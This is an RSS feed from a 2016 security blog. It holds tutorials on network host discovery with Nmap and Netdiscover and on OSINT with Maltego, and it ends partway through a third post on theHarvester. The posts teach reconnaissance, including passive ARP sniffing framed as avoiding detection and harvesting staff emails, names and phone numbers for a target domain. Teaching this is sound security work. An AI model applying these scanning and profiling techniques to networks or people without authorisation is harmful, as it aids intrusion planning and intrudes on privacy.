<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Spread Security</title>
    <description>© 2016 Spread Security | All Rights Reserved 
</description>
    <link>https://spreadsecurity.github.io//</link>
    <atom:link href="https://spreadsecurity.github.io//feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Sun, 25 Sep 2016 18:59:20 +0200</pubDate>
    <lastBuildDate>Sun, 25 Sep 2016 18:59:20 +0200</lastBuildDate>
    <generator>Jekyll v3.1.6</generator>
    
      <item>
        <title>Network Discovery with Nmap and Netdiscover</title>
        <description>&lt;p&gt;Network discovery represents an important phase in the Information Gathering activity: it is the process of identifying live hosts on the network. This means that its purpose is not to find all possible informations about the targets (like open ports or vulnerabilities), but just to understand their logical location inside the network. Mapping targets is useful to model network infrastructure.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Nmap is the most famous and complete tool for network discovery and scanning: it is considered the “Swiss army knife” of network Security tools and it can be used to perform a large variety of tasks.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If you are using Kali Linux, Nmap is already part of your arsenal. Otherwise you can install it from package repositories by using &lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get install nmap&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;yum install nmap&lt;/code&gt; or similar commands depending on your Linux distro. You can even download the latest release from &lt;a href=&quot;https://nmap.org/download.html&quot;&gt;https://nmap.org/download.html&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Usage&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In Kali Linux, Nmap can be started by navigating in the applications menu by clicking on &lt;em&gt;Applications &amp;gt; Information Gathering &amp;gt; nmap&lt;/em&gt; like shown in the following image:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/network_discovery/nmap_start.png&quot;&gt;&lt;img src=&quot;/images/network_discovery/nmap_start.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Same thing can be done by clicking on the “Show application” menu:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/network_discovery/nmap_start2.png&quot;&gt;&lt;img src=&quot;/images/network_discovery/nmap_start2.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Another possibility is launching it by simply opening the Terminal and typing &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt;. In any case, we are prompted with tool version and usage instructions:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap
Nmap 7.25BETA2 ( https://nmap.org )
Usage: nmap [Scan Type(s)] [Options] {target specification}
TARGET SPECIFICATION:
  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
  -iL &amp;lt;inputfilename&amp;gt;: Input from list of hosts/networks
  -iR &amp;lt;num hosts&amp;gt;: Choose random targets
  --exclude &amp;lt;host1[,host2][,host3],...&amp;gt;: Exclude hosts/networks
  --excludefile &amp;lt;exclude_file&amp;gt;: Exclude list from file
HOST DISCOVERY:
  -sL: List Scan - simply list targets to scan
  -sn: Ping Scan - disable port scan
  -Pn: Treat all hosts as online -- skip host discovery
  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
  -PO[protocol list]: IP Protocol Ping
  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
  --dns-servers &amp;lt;serv1[,serv2],...&amp;gt;: Specify custom DNS servers
  --system-dns: Use OS&#39;s DNS resolver
  --traceroute: Trace hop path to each host
...............................................................................
EXAMPLES:
  nmap -v -A scanme.nmap.org
  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
  nmap -v -iR 10000 -Pn -p 80
SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;There is a huge list of parameters through which it is possible to perform a great quantity of activities: host discovery, port scanning, service/version detection, OS detection, Firewall/IDS evasion and spoofing, running scripts using Nmap Scripting Engine (NSE) and so on (above only HOST DISCOVERY options are reported).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Host discovery&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In this article, we focus on host discovery techniques.
We can list hosts belonging to a certain subnet by setting the “-sL” switch; this can be helpful to check the IP addresses belonging to that subnet. The range can be expressed, for example, using the Classless Inter-Domain Routing (CIDR) notation:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -sL 192.168.1.0/24

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-09-18 15:37 CEST
Nmap scan report for 192.168.1.0
Nmap scan report for 192.168.1.1
Nmap scan report for 192.168.1.2
Nmap scan report for 192.168.1.3
.....................................................................
Nmap scan report for 192.168.1.253
Nmap scan report for 192.168.1.254
Nmap scan report for 192.168.1.255
Nmap done: 256 IP addresses (0 hosts up) scanned in 4.26 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Keep in mind this does not send any packet to the hosts: it only makes a list based on the specified network; Nmap by default always tries to do a reverse DNS resolution on the hosts to discover their names.&lt;/p&gt;

&lt;p&gt;Instead, if we want to perform a network discovery, we can use the “-sn” switch; this option takes as input an IP address or a range and checks if a host is online or not by sending Address Resolution Protocol (ARP) requests or Internet Control Message Protocol (ICMP) requests depending on the target subnet location (local or remote).&lt;br /&gt;
In fact referring to the ISO/OSI stack model, since ARP is a layer 2 protocol, it cannot discover remote systems due to its non routable nature; in that case Nmap automatically switches to ICMP requests which are instead layer 3.&lt;br /&gt;
Everytime it is possible, i.e. for hosts on the local subnet, it is better to use ARP discovery since it is faster and highly relayable (ICMP requests can be filtered by Firewalls).&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -sn 192.168.1.0/24

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-09-18 16:25 CEST
Nmap scan report for 192.168.1.1
Host is up (0.0011s latency).
MAC Address: 00:11:22:33:44:55 (Router manufacturer)
Nmap scan report for 192.168.1.100
Host is up (0.00015s latency).
MAC Address: 00:0C:29:59:72:BC (VMware)
Nmap scan report for 192.168.1.201
Host is up (0.00012s latency).
MAC Address: 00:0C:29:A2:56:2B (VMware)
Nmap scan report for 192.168.1.10
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 3.06 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Of course this activity is more intrusive than just listing hosts, but it is a necessary step to understand which machines are up or not.&lt;br /&gt;
We can see that in the network defined by the range 192.168.1.0-255 there are 4 hosts that responded to our ARP requests. For every host discovered it is reported its Media Access Control (MAC) address. This value is made by 6 couples of numbers separated by the colon symbol and represents the host in a unique way since refers to the machine network card (the first three couples indicate the manufacturer).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Analizying network packets&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We can check the discovery activity with a network packet analyzer/sniffer like Wireshark: in Kali, &lt;em&gt;Applications &amp;gt; Sniffing &amp;amp; Spoofing &amp;gt; wireshark&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Once the tool is launched we need to set the network interface we want to listen on, in this case &lt;em&gt;eth0&lt;/em&gt;; this can be done by clicking on &lt;em&gt;Capture &amp;gt; Options&lt;/em&gt; and then selecting the interface:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/network_discovery/wireshark1.png&quot;&gt;&lt;img src=&quot;/images/network_discovery/wireshark1.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Clicking on the Start button launches the packets capture. If now we restart the above Nmap scan we can check its activity in Wireshark main window. The following image shows, as expected, broadcast ARP requests made to the entire range 192.168.1.0-255 by the Kali machine which has IP address 192.168.1.10:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/network_discovery/wireshark2.png&quot;&gt;&lt;img src=&quot;/images/network_discovery/wireshark2.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If a machine has the requested IP address, it will respond declaring its MAC address. Data collected in this way are saved in the ARP cache, which is nothing more than a table containing the list of IP addresses with their associated MAC address.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Netdiscover&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Netdiscover is my preferred tool for local network discovery: it is pretty fast and offers the possibility to perform both active and passive ARP reconnaissance.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If you are using Kali Linux, you have it already available. Otherwise, if for example you are using Ubuntu, you can install it from package repositories by using &lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get install netdiscover&lt;/code&gt; . You can even download the latest release from &lt;a href=&quot;https://sourceforge.net/projects/netdiscover/&quot;&gt;https://sourceforge.net/projects/netdiscover/&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Usage&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In Kali Linux, Nmap can be started by navigating in the applications menu by clicking on &lt;em&gt;Applications &amp;gt; Information Gathering &amp;gt; netdiscover&lt;/em&gt; like shown in the following image:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/network_discovery/netdicover_start.png&quot;&gt;&lt;img src=&quot;/images/network_discovery/netdiscover_start.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Same thing can be done by clicking on the “Show application” menu:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/network_discovery/netdiscover_start2.png&quot;&gt;&lt;img src=&quot;/images/network_discovery/netdiscover_start2.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This opens up a Terminal with usage instructions:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Netdiscover 0.3-pre-beta7 [Active/passive arp reconnaissance tool]
Written by: Jaime Penalba &amp;lt;jpenalbae@gmail.com&amp;gt;

Usage: netdiscover [-i device] [-r range | -l file | -p] [-m file] [-s time] [-n node] [-c count] [-f] [-d] [-S] [-P] [-c]
  -i device: your network device
  -r range: scan a given range instead of auto scan. 192.168.6.0/24,/16,/8
  -l file: scan the list of ranges contained into the given file
  -p passive mode: do not send anything, only sniff
  -m file: scan the list of known MACs and host names
  -F filter: Customize pcap filter expression (default: &quot;arp&quot;)
  -s time: time to sleep between each arp request (milliseconds)
  -n node: last ip octet used for scanning (from 2 to 253)
  -c count: number of times to send each arp reques (for nets with packet loss)
  -f enable fastmode scan, saves a lot of time, recommended for auto
  -d ignore home config files for autoscan and fast mode
  -S enable sleep time supression between each request (hardcore mode)
  -P print results in a format suitable for parsing by another program
  -N Do not print header. Only valid when -P is enabled.
  -L in parsable output mode (-P), continue listening after the active scan is completed

If -r, -l or -p are not enabled, netdiscover will scan for common lan addresses.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;They are pretty explanatory; an example of active ARP reconnaissance is this one:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# netdiscover -r 192.168.1.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname 
 -----------------------------------------------------------------------------
 192.168.1.1     00:11:22:33:44:55      1      60  Router Manufacturer
 192.168.1.100   00:0c:29:59:72:bc      1      60  VMware, Inc.
 192.168.1.200   00:0c:29:3a:cb:5b      1      60  VMware, Inc.
 192.168.1.201   00:0c:29:a2:56:2b      1      60  VMware, Inc.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;As reported the tool scanned the subnet 192.168.1.0/24 by sendind ARP request on the network and finding out the same four hosts seen before.&lt;/p&gt;

&lt;p&gt;If we want to maintain a low profile to avoid getting caught, we can set up a passive ARP discovery; in this case we just sit sniffing the network traffic:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# netdiscover -p
 Currently scanning: (passive)   |   Screen View: Unique Hosts
 10 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 600
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.201   00:0c:29:a2:56:2b      5     300  VMware, Inc.
 192.168.1.1     00:11:22:33:44:55      2     120  Router Manufacturer
 192.168.1.200   00:0c:29:3a:cb:5b      1      60  VMware, Inc.
 192.168.1.100   00:0c:29:59:72:bc      2     120  VMware, Inc. 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Of course this will take longer w.r.t. the active scan, but it is difficult to detect since we are just listening for ARP requests and responses on the network made by other systems.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Conclusions&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We have seen how to use Nmap and Netdiscover for discovering live hosts inside a network. They are both useful tools even if Nmap is better for a port scanning and service detection purpose (in a forthcoming article we will take a look at how it can be used to perform these tasks).&lt;/p&gt;
</description>
        <pubDate>Sun, 25 Sep 2016 00:00:00 +0200</pubDate>
        <link>https://spreadsecurity.github.io//2016/09/25/network-discovery-with-nmap-and-netdiscover.html</link>
        <guid isPermaLink="true">https://spreadsecurity.github.io//2016/09/25/network-discovery-with-nmap-and-netdiscover.html</guid>
        
        <category>Information gathering</category>
        
        <category>Network discovery</category>
        
        <category>Nmap</category>
        
        <category>Netdiscover</category>
        
        <category>Network packet analysis</category>
        
        <category>Wireshark</category>
        
        
      </item>
    
      <item>
        <title>Open Source Intelligence with Maltego</title>
        <description>&lt;p&gt;Maltego is a visual link analysis and data mining tool and it is the most famous software for performing Open Source Intelligence. It provides a library of plugins, called “transforms”, which are used to execute queries on open sources in order to gather information about a certain target and display them on a nice graph. In fact, differently from the command line tools seen until now, Maltego has a Graphical User Interface through which the user performs his research and analyzes results returned on the graph.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;It is developed by Paterva which distributes three different versions: Maltego XL, Classic and CE.
We are interested in Maltego CE which stands for Community Edition: this is the non commercial version and it is available for everyone after a quick registration.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Before proceeding with the installation it is a good idea to register at this link: &lt;a href=&quot;https://www.paterva.com/web7/community/community.php&quot;&gt;https://www.paterva.com/web7/community/community.php&lt;/a&gt;. In fact, in order to use the software it is mandatory to have a Maltego account which is required at the startup of the application.&lt;/p&gt;

&lt;p&gt;If you are using Kali Linux, Maltego CE is already installed. Moreover you will find that Kali has its own custom version called Maltego Chlorine, which has been made on purpose for this distro.&lt;br /&gt;
Otherwise you can download the package from &lt;a href=&quot;https://www.paterva.com/web7/downloads.php#tab-3&quot;&gt;https://www.paterva.com/web7/downloads.php#tab-3&lt;/a&gt; and install it on your operating system (the software is available for Windows, Linux or Mac OSX).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Usage&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In Kali Linux, Maltego can be started by navigating in the applications menu by clicking on &lt;em&gt;Applications &amp;gt; Information Gathering &amp;gt; maltegoce&lt;/em&gt; like shown in the following image:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_start.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_start.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Same thing can be done by clicking on the “Show application” menu:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_start2.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_start2.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Maltego can also be started by opening the Terminal and typing &lt;code class=&quot;highlighter-rouge&quot;&gt;maltegoce&lt;/code&gt;, but since it is not a command line tool, this is not the best choice.&lt;/p&gt;

&lt;p&gt;At the start up, after all the modules are correctly loaded, we get prompted with the Startup Wizard which asks for Maltego account credentials:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_account.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_account.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you have inserted them and correctly solved the captcha, you will get a welcome message and the information about the validity of the API key.  At the next prompt just leave “Install Transforms from Maltego public servers” which will install the transforms on the client.&lt;br /&gt;
At the final screen we get the correct initialization message with different possibilities for starting to use Maltego:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/images/maltego/maltego_ready.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_ready.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;“Run a machine” allows you to run predefined searches, called “machines”: for example, the “Company Stalker” machine gets all email addresses it can find on the web for a certain domain and look for related account on social networks; it also gets documents and extract metadata from them.&lt;br /&gt;
Since we want to perform a custom search we need to select “Open a blank graph and let me play around” and then click on “Finish”. This action opens a new empty graph where we can start a new OSINT activity:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_new.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_new.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We could have also opened a new graph by simply clicking on Maltego icon on the top left choosing “New”.&lt;br /&gt;
As the image shows, on the top part we have six tabs:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Investigate - offers options to quickly search through the graph or to select entities;&lt;/li&gt;
  &lt;li&gt;Manage - allows to import/export configurations, manage entities and transforms;&lt;/li&gt;
  &lt;li&gt;View - allows to choose which panels are active;&lt;/li&gt;
  &lt;li&gt;Organize - sets the node layout mode and the alignment type;&lt;/li&gt;
  &lt;li&gt;Machines - allows to run, stop, create and manage machines;&lt;/li&gt;
  &lt;li&gt;Collaboration - offers options to share projects and results.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There is a big central window which is where the graph will be developed and on the tab it is reported the name of the graph (you can save the project and give it a proper name).&lt;br /&gt;
On the left side we have the “Palette” panel which contains the following categories:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Devices - adds a node such as a phone or camera;&lt;/li&gt;
  &lt;li&gt;Infrastructure - adds a node such as a domain, MX record or Website;&lt;/li&gt;
  &lt;li&gt;Locations - adds a node such as a GPS coordinate or location name;&lt;/li&gt;
  &lt;li&gt;Malware - adds a node as hash entity;&lt;/li&gt;
  &lt;li&gt;Penetration Testing - adds a node which identifies a technology;&lt;/li&gt;
  &lt;li&gt;Personal - adds a node such as a document, email address or person name;&lt;/li&gt;
  &lt;li&gt;Social Network - adds a node related to social networks like Facebook or Twitter.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Each of them contains objects related to that category: these items can be dragged on the graph and, once placed there, it is possible to use them as starting point for a search activity. This can be done thanks to the application of &lt;em&gt;transforms&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;As done in the previous Information Gathering posts, we can use as target the National Institute of Standards and Technology (NIST).
We can start by clicking on “Infrastructure” and dragging on the graph a “Domain” object; by double clicking on it we can change its name into “nist.gov”:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_nist.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_nist.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now informations are displayed also in the other four panels:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Run View - contains Transforms and Machines that it is possible to run against the selected object;&lt;/li&gt;
  &lt;li&gt;Overview - shows a schematic graph where nodes are represented by colored circles;&lt;/li&gt;
  &lt;li&gt;Detail View - displays informations about the selected object;&lt;/li&gt;
  &lt;li&gt;Property View - shows properties regarding the selected object.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To run a transform on the object we can either access them through the “Run View” panel or by simply clicking on the object with the right mouse button. “All Transforms”  contains all the possible transforms we can apply to that object type, which in this case is a Domain object.&lt;br /&gt;
The same transforms can also be found by looking inside the following four groups (of course they vary depending on the object type):&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;DNS from Domain;&lt;/li&gt;
  &lt;li&gt;Domain owner detail;&lt;/li&gt;
  &lt;li&gt;Email addresses from Domain;&lt;/li&gt;
  &lt;li&gt;Files and Documents from Domain.&lt;/li&gt;
&lt;/ul&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_transforms.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_transforms.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We can start by running the transform &lt;em&gt;DNS from Domain &amp;gt; DomainToDNSNameSchema&lt;/em&gt; which tries various name schema’s against the object domain; once the disclaimer is accepted, we can run the transform:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_DomainToDNSNameSchema.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_DomainToDNSNameSchema.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The execution of the transform can be verified in the “Output - Transform Output” panel: as reported, the tool searches for subdomains using lists of common names which are loaded on Paterva servers as files with extension “.bfdns”.&lt;br /&gt;
We can see that the graph is populated with subdomains found by the search; it is possible to switch from the Main View to the Bubble View or to the Entity List by simply clicking on the respective buttons on the top of the graph.&lt;br /&gt;
There is also the chance to change the layout mode by clicking on the icons on the upper part of the graph window; the default one is called “Block”.&lt;br /&gt;
Note that entities belonging to the same category are represented by circles of the same color in the Overview panel.&lt;/p&gt;

&lt;p&gt;Suppose we want to find the IP address for a certain subdomain, then we right click on the object and run &lt;em&gt;Resolve to IP&lt;/em&gt;; we can even select multiple objects using the “Shift” button and apply the transform to all of them:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_ResolveToIP.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_ResolveToIP.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Once we have the IP addresses we can run a further transform that returns the geolocation for that IP; just right click on the object, then &lt;em&gt;IP owner detail &amp;gt; toLocation&lt;/em&gt; and run it by clicking on the yellow arrow:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_ToLocation.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_ToLocation.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The transform group “IP owner detail” is also really useful to find informations like email addresses, entities (person names) and phone numbers, so it is a good idea to take a look at the others transforms inside it.&lt;/p&gt;

&lt;p&gt;Now suppose we want to check, in a passive way, which websites are associated to the target domain: &lt;em&gt;DNS from Domain &amp;gt; To Website DNS [using Search Engines]&lt;/em&gt; is the transform we want to use. We can also choose which search engine we want to launch the query against (default is Bing); this can be done by clicking on the “Configure” icon near the yellow arrow key:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_configure.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_configure.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In this configuration menu there are also reported all the other transforms loaded in Maltego with their Status, Transform Server Location, Default Set, Input and Output informations.&lt;br /&gt;
Keep in mind that some transforms are more invasive than others: for example, it is possible to discover websites querying directly port 80 using the transform &lt;em&gt;To Web site [Query port 80]&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This is the resulting graph with a focus on the websites:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_ToWebsite.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_ToWebsite.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Note how Maltego automatically organizes nodes on the graph.&lt;/p&gt;

&lt;p&gt;A really useful transform which can be applied to Website objects is &lt;em&gt;ToServerTechnologiesWebsite&lt;/em&gt;; using the BuiltWith.com API it is able to retrieve informations about the technologies running on the target website:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_ToServerTechnologiesWebsite.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_ToServerTechnologiesWebsite.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you think the graph is becoming heavy, it is possible to remove unwanted nodes by selecting them and pressing the “Canc” button.&lt;br /&gt;
Another interesting transform is the one named &lt;em&gt;Files and Documents from Domain&lt;/em&gt;: this will search for files and documents inside the given domain with the extensions reported in the configuration menu; by clicking on the node representing a file we can get informations about the query used to find it with the document download link.&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/maltego/maltego_ToFiles.png&quot;&gt;&lt;img src=&quot;/images/maltego/maltego_ToFiles.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The following step could be to find email addresses related to the target domain by using &lt;em&gt;Email addresses from Domain&lt;/em&gt; transform on the “Domain” object; then we could run &lt;em&gt;To Person&lt;/em&gt; transform on the “Email” object to get person identity related to that email address or &lt;em&gt;To Phone number [using Search Engine]&lt;/em&gt; transform to try a phone number discovery.&lt;/p&gt;

&lt;p&gt;Like seen before, another way to proceed is to use predefined search machines which are configured to run with a more or less invasive approach against the target; be aware that you can create your own machine so as to exactly perform the queries you need and nothing more.&lt;/p&gt;

&lt;p&gt;You can even create your own transforms: &lt;a href=&quot;http://dev.paterva.com/developer/getting_started/building_your_own_tds_transform.php&quot;&gt;http://dev.paterva.com/developer/getting_started/building_your_own_tds_transform.php&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Conclusions&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Maltego is a powerful graphical tool for OSINT and it can be customized depending on your own needs. Since it generates graphs it gives a rapid overview of the target structure, differently from command line tools. This is why it is always important to work with more than one tool so as to have a better picture of the target.&lt;br /&gt;
As always,  experiment with the transforms by yourself (there is a very good amount of them) to make the most of Maltego potential.&lt;/p&gt;
</description>
        <pubDate>Sat, 03 Sep 2016 00:00:00 +0200</pubDate>
        <link>https://spreadsecurity.github.io//2016/09/03/open-source-intelligence-with-maltego.html</link>
        <guid isPermaLink="true">https://spreadsecurity.github.io//2016/09/03/open-source-intelligence-with-maltego.html</guid>
        
        <category>Information gathering</category>
        
        <category>OSINT</category>
        
        <category>Maltego</category>
        
        
      </item>
    
      <item>
        <title>Open Source Intelligence with theHarvester</title>
        <description>&lt;p&gt;Another interesting tool for gathering informations, which can be used in combination with &lt;a href=&quot;https://spreadsecurity.github.io/2016/08/01/open-source-web-reconnaissance-with-recon-ng.html&quot;&gt;Recon-ng&lt;/a&gt;, is theHarvester.&lt;br /&gt;
Even if this tool is not as complex as Recon-ng, it helps to harvest a huge quantity of data in an automated way by using web search engines and social networks. By doing so, this information gathering suite allows to understand target footprints on the Internet, so it is useful to know what an attacker can see on the web about a certain company.
&lt;!--more--&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If you are using Kali Linux, theHarvester is already a part of your arsenal. Otherwise you can get the latest version from author repository using &lt;code class=&quot;highlighter-rouge&quot;&gt;git clone&lt;/code&gt; and install the tool on your favourite Linux distro: &lt;a href=&quot;https://github.com/laramies/theHarvester&quot;&gt;https://github.com/laramies/theHarvester&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Usage&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In Kali Linux, theHarvester can be started by navigating in the applications menu by clicking on &lt;em&gt;Applications &amp;gt; Information Gathering &amp;gt; OSINT Analysis &amp;gt; theharvester&lt;/em&gt; like shown in the following image:&lt;/p&gt;

&lt;p class=&quot;center&quot;&gt;&lt;a href=&quot;/images/theharvester/theharvester_start.png&quot;&gt;&lt;img src=&quot;/images/theharvester/theharvester_start.png&quot; alt=&quot;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Same thing can be done by clicking on the “Show application” menu:&lt;/p&gt;

